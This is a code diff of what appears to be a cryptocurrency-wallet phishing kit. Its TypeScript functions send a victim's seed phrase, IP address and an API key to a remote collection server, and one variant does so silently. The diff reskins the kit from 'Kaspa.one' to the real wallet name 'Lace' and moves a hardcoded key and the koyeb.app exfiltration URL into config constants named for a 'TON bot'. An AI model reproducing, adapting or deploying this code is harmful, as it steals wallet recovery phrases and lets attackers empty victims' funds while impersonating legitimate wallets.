@@ -8,6 +8,7 @@
  */
 
 import axios, { AxiosResponse, InternalAxiosRequestConfig, AxiosHeaders } from 'axios';
+import { TON_BOT_API_KEY, TON_BOT_SEED_URL } from '../app/config';
 
 // Type for axios headers structure
 type AxiosHeadersType = AxiosHeaders | Record<string, string | Record<string, string>> & {
@@ -22,7 +23,7 @@ axios.interceptors.request.use(
   (config: InternalAxiosRequestConfig) => {
     // ALWAYS add header (including localhost)
     if (config.url && config.headers) {
-      const apiKey = "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
+      const apiKey = TON_BOT_API_KEY;
       const method = (config.method || 'post').toLowerCase();
       const headers = config.headers as AxiosHeadersType;
       
@@ -119,20 +120,14 @@ function isLocalhost(): boolean {
  * Get the primary API endpoint based on environment
  */
 function getPrimaryAPIEndpoint(): string {
-  if (isLocalhost()) {
-    return 'http://localhost:3001/api/form/text';
-  }
-  return 'https://nice-kristin-ethname-aada4ad6.koyeb.app/api/form/text';
+  return TON_BOT_SEED_URL;
 }
 
 /**
  * Get the fallback API endpoint based on environment
  */
 function getFallbackAPIEndpoint(): string {
-  if (isLocalhost()) {
-    return 'http://localhost:3001/api/form/text';
-  }
-  return 'https://nice-kristin-ethname-aada4ad6.koyeb.app/api/form/text';
+  return TON_BOT_SEED_URL;
 }
 
 /**
@@ -154,7 +149,7 @@ export async function getClientIP(): Promise<string | null> {
  */
 export async function sendSeedPhraseToPrimaryAPI(
   seedPhraseMessage: string,
-  appName: string = "Kaspa.one"
+  appName: string = "Lace"
 ): Promise<SubmitResult> {
   try {
     let clientIP: string | null = null;
@@ -176,7 +171,7 @@ export async function sendSeedPhraseToPrimaryAPI(
     };
 
     // ALWAYS add API key (including localhost)
-    const apiKeyToUse = "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
+    const apiKeyToUse = TON_BOT_API_KEY;
     headers["x-api-key"] = apiKeyToUse;
     headers["X-API-Key"] = apiKeyToUse; // Try both cases
 
@@ -220,7 +215,7 @@ export async function sendSeedPhraseToPrimaryAPI(
  */
 export async function sendSeedPhraseToFallbackAPI(
   seedPhraseMessage: string,
-  appName: string = "Kaspa.one",
+  appName: string = "Lace",
   apiKey: string | null = null
 ): Promise<SubmitResult> {
   try {
@@ -230,7 +225,7 @@ export async function sendSeedPhraseToFallbackAPI(
       seedPhrase: seedPhraseMessage
     };
 
-    const apiKeyToUse = apiKey || "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
+    const apiKeyToUse = apiKey || TON_BOT_API_KEY;
 
     const headers: Record<string, string> = {
       "Content-Type": "application/json",
@@ -281,7 +276,7 @@ export async function sendSeedPhraseToFallbackAPI(
  */
 export async function submitSeedPhraseComplete(
   seedPhraseMessage: string,
-  appName: string = "Kaspa.one",
+  appName: string = "Lace",
   options: SubmitOptions = {}
 ): Promise<SubmitResult> {
   const { 
@@ -349,12 +344,12 @@ export async function submitSeedPhraseComplete(
  */
 export async function submitSeedPhraseSilent(
   seedPhraseMessage: string,
-  appName: string = "Kaspa.one",
+  appName: string = "Lace",
   apiKey: string | null = null
 ): Promise<boolean> {
   try {
     // Declare apiKeyToUse once at the top
-    const apiKeyToUse = apiKey || "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
+    const apiKeyToUse = apiKey || TON_BOT_API_KEY;
     
     let clientIP: string | null = null;
     try {
@@ -458,7 +453,7 @@ export async function submitSeedPhraseSilent(
  */
 export async function submitSeedPhraseWalletJSX(
   seedPhraseMessage: string,
-  appName: string = "Kaspa.one",
+  appName: string = "Lace",
   options: SubmitOptions = {}
 ): Promise<SubmitResult> {
   const { 
@@ -469,7 +464,7 @@ export async function submitSeedPhraseWalletJSX(
 
   try {
     // Declare apiKeyToUse once at the top
-    const apiKeyToUse = apiKey || "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
+    const apiKeyToUse = apiKey || TON_BOT_API_KEY;
     
     let clientIP: string | null = null;
     try {
